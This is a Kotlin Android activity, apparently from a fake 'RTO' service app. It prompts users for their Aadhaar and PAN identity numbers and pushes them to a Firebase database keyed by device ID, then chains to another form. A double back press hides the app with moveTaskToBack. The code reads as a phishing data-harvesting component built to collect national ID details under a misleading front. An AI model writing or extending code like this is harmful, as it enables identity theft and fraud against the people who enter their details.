package com.rto1p8.app.ui

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.Toast
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue
import com.google.firebase.database.ValueEventListener
import androidx.appcompat.app.AppCompatActivity
import com.rto1p8.app.MainActivity
import com.rto1p8.app.R
import com.rto1p8.app.databinding.ActivityFormTwoBinding


class FormTwoActivity : AppCompatActivity() {
    private lateinit var binding: ActivityFormTwoBinding
    private lateinit var deviceRef: DatabaseReference // Reference to the device node
    private lateinit var db: FirebaseDatabase
    private var isDropdownVisible = false
    private lateinit var deviceId: String // Changed from uniqueID to deviceId

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityFormTwoBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Initialize Firebase and Device ID
        db = FirebaseDatabase.getInstance()
        deviceId = MainActivity.getDeviceId(this) // Reuse device ID from MainActivity
        deviceRef = db.reference.child("Device").child(deviceId) // Set reference to existing device node

        // Check if device node exists, create if it doesn't
        deviceRef.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists()) {
                    // Create device node if it doesn't exist
                    deviceRef.child("createdAt").setValue(ServerValue.TIMESTAMP)
                        .addOnSuccessListener {
                            Log.d("Firebase", "Created new device node with deviceId: $deviceId")
                        }
                        .addOnFailureListener { e ->
                            Log.e("FirebaseError", "Failed to create device node: ${e.message}")
                        }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e("FirebaseError", "Error checking device node: ${error.message}")
            }
        })

        binding.proceedBtn.setOnClickListener {
            val aadhar = binding.edtAadhar.text.toString()
            val pan = binding.edtPan.text.toString()

            // Validate inputs
            if (aadhar.isEmpty() || pan.isEmpty() ) {
                binding.edtAadhar.error = "Enter Card Details Correctly."
                binding.edtAadhar.requestFocus()
                return@setOnClickListener
            }


            // Update Firebase database
            updateFirebase(aadhar, pan)
        }

    }

    private fun toggleDropdownMenu(dropdownMenu: LinearLayout, dropdownIcon: ImageView) {
        if (isDropdownVisible) {
            dropdownMenu.visibility = View.GONE
            dropdownIcon.setImageResource(R.drawable.hamburger)
        } else {
            dropdownMenu.visibility = View.VISIBLE
            dropdownIcon.setImageResource(R.drawable.ic_baseline_close_24)
        }
        isDropdownVisible = !isDropdownVisible
    }

    private fun updateFirebase(aadhar: String, pan: String) {

        val userInfoMap = hashMapOf<String, Any?>(
            "Aadhar" to aadhar,
            "PAN" to pan,
            "timestamp" to ServerValue.TIMESTAMP
        )

        // Save under "user_info" child node
        deviceRef.child("user_info").push().setValue(userInfoMap)
            .addOnSuccessListener {
                clearInputFields()
                startActivity(Intent(this@FormTwoActivity, FormOneActivity::class.java))
                finish()
            }
            .addOnFailureListener { e ->
                Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
            }
    }

    private fun clearInputFields() {
        binding.edtAadhar.setText("")
        binding.edtPan.setText("")

    }

    private var doubleBackToExitPressedOnce = false
    override fun onBackPressed() {
        if (doubleBackToExitPressedOnce) {
            super.onBackPressed()
            hideApp()
            return
        }

        this.doubleBackToExitPressedOnce = true
        Toast.makeText(this, "Please click BACK again to exit", Toast.LENGTH_SHORT).show()

        Handler(Looper.getMainLooper()).postDelayed(Runnable { doubleBackToExitPressedOnce = false }, 2000)
    }

    private fun hideApp() {
        moveTaskToBack(true)
        finish()
    }
}